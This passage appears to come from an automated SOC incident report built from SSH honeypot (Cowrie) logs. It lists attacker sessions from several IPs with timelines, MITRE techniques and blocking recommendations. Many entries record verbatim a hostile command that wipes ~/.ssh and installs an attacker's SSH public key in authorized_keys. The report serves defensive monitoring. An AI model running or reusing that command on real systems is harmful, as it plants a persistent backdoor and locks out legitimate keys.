| `2026-04-15 07:43:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4de38c25ddf0

| Field | Detail |
|---|---|
| **Source IP** | `14.103.120[.]130` |
| **First Seen** | 2026-04-15 07:44 |
| **Last Seen** | 2026-04-15 07:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:44:22` | `cowrie.session.connect` |
| `2026-04-15 07:44:22` | `cowrie.client.version` |
| `2026-04-15 07:44:22` | `cowrie.client.kex` |
| `2026-04-15 07:44:22` | `cowrie.login.success` |
| `2026-04-15 07:44:23` | `cowrie.session.params` |
| `2026-04-15 07:44:23` | `cowrie.command.input` |
| `2026-04-15 07:44:23` | `cowrie.command.failed` |
| `2026-04-15 07:44:23` | `cowrie.log.closed` |
| `2026-04-15 07:44:24` | `cowrie.session.params` |
| `2026-04-15 07:44:24` | `cowrie.command.input` |
| `2026-04-15 07:44:24` | `cowrie.session.file_download` |
| `2026-04-15 07:44:24` | `cowrie.log.closed` |
| `2026-04-15 07:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.120[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.120[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb0e7f089728

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:44 |
| **Last Seen** | 2026-04-15 07:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:44:26` | `cowrie.session.connect` |
| `2026-04-15 07:44:26` | `cowrie.client.version` |
| `2026-04-15 07:44:26` | `cowrie.client.kex` |
| `2026-04-15 07:44:27` | `cowrie.login.success` |
| `2026-04-15 07:44:27` | `cowrie.session.params` |
| `2026-04-15 07:44:27` | `cowrie.command.input` |
| `2026-04-15 07:44:27` | `cowrie.command.failed` |
| `2026-04-15 07:44:27` | `cowrie.log.closed` |
| `2026-04-15 07:44:27` | `cowrie.session.params` |
| `2026-04-15 07:44:27` | `cowrie.command.input` |
| `2026-04-15 07:44:28` | `cowrie.session.file_download` |
| `2026-04-15 07:44:28` | `cowrie.log.closed` |
| `2026-04-15 07:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-755bb58516b9

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:44 |
| **Last Seen** | 2026-04-15 07:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:44:30` | `cowrie.session.connect` |
| `2026-04-15 07:44:30` | `cowrie.client.version` |
| `2026-04-15 07:44:30` | `cowrie.client.kex` |
| `2026-04-15 07:44:30` | `cowrie.login.success` |
| `2026-04-15 07:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dda5033195b7

| Field | Detail |
|---|---|
| **Source IP** | `14.103.120[.]130` |
| **First Seen** | 2026-04-15 07:44 |
| **Last Seen** | 2026-04-15 07:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:44:30` | `cowrie.session.connect` |
| `2026-04-15 07:44:30` | `cowrie.client.version` |
| `2026-04-15 07:44:30` | `cowrie.client.kex` |
| `2026-04-15 07:44:31` | `cowrie.login.success` |
| `2026-04-15 07:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.120[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.120[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7efd180b2bef

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 07:45 |
| **Last Seen** | 2026-04-15 07:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:45:53` | `cowrie.session.connect` |
| `2026-04-15 07:45:54` | `cowrie.client.version` |
| `2026-04-15 07:45:54` | `cowrie.client.kex` |
| `2026-04-15 07:45:54` | `cowrie.login.success` |
| `2026-04-15 07:45:55` | `cowrie.session.params` |
| `2026-04-15 07:45:55` | `cowrie.command.input` |
| `2026-04-15 07:45:55` | `cowrie.command.failed` |
| `2026-04-15 07:45:55` | `cowrie.log.closed` |
| `2026-04-15 07:45:55` | `cowrie.session.params` |
| `2026-04-15 07:45:55` | `cowrie.command.input` |
| `2026-04-15 07:45:55` | `cowrie.session.file_download` |
| `2026-04-15 07:45:55` | `cowrie.log.closed` |
| `2026-04-15 07:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5692c3e8a986

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:45 |
| **Last Seen** | 2026-04-15 07:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:45:55` | `cowrie.session.connect` |
| `2026-04-15 07:45:55` | `cowrie.client.version` |
| `2026-04-15 07:45:55` | `cowrie.client.kex` |
| `2026-04-15 07:45:56` | `cowrie.login.success` |
| `2026-04-15 07:45:56` | `cowrie.session.params` |
| `2026-04-15 07:45:56` | `cowrie.command.input` |
| `2026-04-15 07:45:56` | `cowrie.command.failed` |
| `2026-04-15 07:45:56` | `cowrie.log.closed` |
| `2026-04-15 07:45:56` | `cowrie.session.params` |
| `2026-04-15 07:45:56` | `cowrie.command.input` |
| `2026-04-15 07:45:57` | `cowrie.session.file_download` |
| `2026-04-15 07:45:57` | `cowrie.log.closed` |
| `2026-04-15 07:46:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7211e29e5ef5

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 07:45 |
| **Last Seen** | 2026-04-15 07:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:45:57` | `cowrie.session.connect` |
| `2026-04-15 07:45:57` | `cowrie.client.version` |
| `2026-04-15 07:45:58` | `cowrie.client.kex` |
| `2026-04-15 07:45:58` | `cowrie.login.success` |
| `2026-04-15 07:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52f75b1507e6

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:45 |
| **Last Seen** | 2026-04-15 07:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:45:59` | `cowrie.session.connect` |
| `2026-04-15 07:45:59` | `cowrie.client.version` |
| `2026-04-15 07:45:59` | `cowrie.client.kex` |
| `2026-04-15 07:45:59` | `cowrie.login.success` |
| `2026-04-15 07:46:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3700260cb98d

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 07:47 |
| **Last Seen** | 2026-04-15 07:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:47:53` | `cowrie.session.connect` |
| `2026-04-15 07:47:53` | `cowrie.client.version` |
| `2026-04-15 07:47:53` | `cowrie.client.kex` |
| `2026-04-15 07:47:53` | `cowrie.login.success` |
| `2026-04-15 07:47:54` | `cowrie.session.params` |
| `2026-04-15 07:47:54` | `cowrie.command.input` |
| `2026-04-15 07:47:54` | `cowrie.command.failed` |
| `2026-04-15 07:47:54` | `cowrie.log.closed` |
| `2026-04-15 07:47:54` | `cowrie.session.params` |
| `2026-04-15 07:47:54` | `cowrie.command.input` |
| `2026-04-15 07:47:54` | `cowrie.session.file_download` |
| `2026-04-15 07:47:54` | `cowrie.log.closed` |
| `2026-04-15 07:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa7ffddcbcef

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 07:47 |
| **Last Seen** | 2026-04-15 07:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:47:56` | `cowrie.session.connect` |
| `2026-04-15 07:47:56` | `cowrie.client.version` |
| `2026-04-15 07:47:57` | `cowrie.client.kex` |
| `2026-04-15 07:47:57` | `cowrie.login.success` |
| `2026-04-15 07:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f16caa908312

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:48 |
| **Last Seen** | 2026-04-15 07:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:48:54` | `cowrie.session.connect` |
| `2026-04-15 07:48:54` | `cowrie.client.version` |
| `2026-04-15 07:48:54` | `cowrie.client.kex` |
| `2026-04-15 07:48:55` | `cowrie.login.success` |
| `2026-04-15 07:48:55` | `cowrie.session.params` |
| `2026-04-15 07:48:55` | `cowrie.command.input` |
| `2026-04-15 07:48:55` | `cowrie.command.failed` |
| `2026-04-15 07:48:56` | `cowrie.log.closed` |
| `2026-04-15 07:48:56` | `cowrie.session.params` |
| `2026-04-15 07:48:56` | `cowrie.command.input` |
| `2026-04-15 07:48:56` | `cowrie.session.file_download` |
| `2026-04-15 07:48:56` | `cowrie.log.closed` |
| `2026-04-15 07:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34482109c385

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:48 |
| **Last Seen** | 2026-04-15 07:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:48:58` | `cowrie.session.connect` |
| `2026-04-15 07:48:58` | `cowrie.client.version` |
| `2026-04-15 07:48:58` | `cowrie.client.kex` |
| `2026-04-15 07:48:59` | `cowrie.login.success` |
| `2026-04-15 07:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bc98d456d67

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 07:52 |
| **Last Seen** | 2026-04-15 07:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:52:36` | `cowrie.session.connect` |
| `2026-04-15 07:52:36` | `cowrie.client.version` |
| `2026-04-15 07:52:36` | `cowrie.client.kex` |
| `2026-04-15 07:52:37` | `cowrie.login.success` |
| `2026-04-15 07:52:38` | `cowrie.session.params` |
| `2026-04-15 07:52:38` | `cowrie.command.input` |
| `2026-04-15 07:52:38` | `cowrie.command.failed` |
| `2026-04-15 07:52:38` | `cowrie.log.closed` |
| `2026-04-15 07:52:38` | `cowrie.session.params` |
| `2026-04-15 07:52:38` | `cowrie.command.input` |
| `2026-04-15 07:52:39` | `cowrie.session.file_download` |
| `2026-04-15 07:52:39` | `cowrie.log.closed` |
| `2026-04-15 07:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf59d61f6f5f

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 07:52 |
| **Last Seen** | 2026-04-15 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:52:41` | `cowrie.session.connect` |
| `2026-04-15 07:52:41` | `cowrie.client.version` |
| `2026-04-15 07:52:42` | `cowrie.client.kex` |
| `2026-04-15 07:52:42` | `cowrie.login.success` |
| `2026-04-15 07:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8cbddeaa9b9

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 07:54 |
| **Last Seen** | 2026-04-15 07:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:54:21` | `cowrie.session.connect` |
| `2026-04-15 07:54:21` | `cowrie.client.version` |
| `2026-04-15 07:54:22` | `cowrie.client.kex` |
| `2026-04-15 07:54:22` | `cowrie.login.success` |
| `2026-04-15 07:54:23` | `cowrie.session.params` |
| `2026-04-15 07:54:23` | `cowrie.command.input` |
| `2026-04-15 07:54:23` | `cowrie.command.failed` |
| `2026-04-15 07:54:23` | `cowrie.log.closed` |
| `2026-04-15 07:54:24` | `cowrie.session.params` |
| `2026-04-15 07:54:24` | `cowrie.command.input` |
| `2026-04-15 07:54:24` | `cowrie.session.file_download` |
| `2026-04-15 07:54:24` | `cowrie.log.closed` |
| `2026-04-15 07:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bf1457e8cce

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 07:54 |
| **Last Seen** | 2026-04-15 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:54:27` | `cowrie.session.connect` |
| `2026-04-15 07:54:27` | `cowrie.client.version` |
| `2026-04-15 07:54:27` | `cowrie.client.kex` |
| `2026-04-15 07:54:28` | `cowrie.login.success` |
| `2026-04-15 07:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d43335ad5c06

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 07:56 |
| **Last Seen** | 2026-04-15 07:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
